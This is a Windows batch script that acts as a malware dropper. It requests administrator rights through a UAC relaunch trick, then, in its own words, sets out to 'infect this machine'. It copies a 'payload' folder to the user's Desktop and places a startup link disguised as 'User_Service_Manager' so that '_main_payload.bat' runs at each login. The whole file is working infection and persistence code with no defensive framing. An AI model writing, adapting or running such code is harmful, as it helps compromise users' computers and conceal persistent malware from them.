@echo off

:: BatchGotAdmin
:-------------------------------------

    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
>nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    pushd "%CD%"
    CD /D "%~dp0"
:--------------------------------------    

SET mypath=%~dp0
cd /D %mypath:~0,-1%

:: Infect this machine with copy command to desktop (hidden)
:: Copy shortcut of that to startup
:: Restart for payload to run


xcopy /S /I /H /Y /C "%~dp0payload" "%userprofile%\Desktop\payload"


mklink "%userprofile%\Start Menu\Programs\Startup\User_Service_Manager" "%userprofile%\Desktop\payload\_main_payload.bat"
